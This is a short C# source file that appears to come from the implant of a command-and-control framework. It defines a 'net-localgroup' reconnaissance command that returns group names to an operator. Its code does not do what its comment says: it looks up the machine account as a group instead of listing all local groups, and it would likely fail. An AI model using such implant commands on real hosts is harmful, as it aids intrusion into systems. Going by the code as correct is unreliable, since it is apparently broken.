using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class net_localgroup : EngineerCommand
    {
        public override string Name => "net-localgroup";

        public override string Execute(EngineerTask task)
        {
            //get a list of all of the local groups on the current computer and return them one one entry per line
            var output = new StringBuilder();
            foreach (var group in System.DirectoryServices.AccountManagement.GroupPrincipal.FindByIdentity(new System.DirectoryServices.AccountManagement.PrincipalContext(System.DirectoryServices.AccountManagement.ContextType.Machine), System.DirectoryServices.AccountManagement.IdentityType.SamAccountName, System.Environment.MachineName + "$").GetGroups())
            {
                output.AppendLine(group.Name);
            }
            return output.ToString();

        }
    }
}
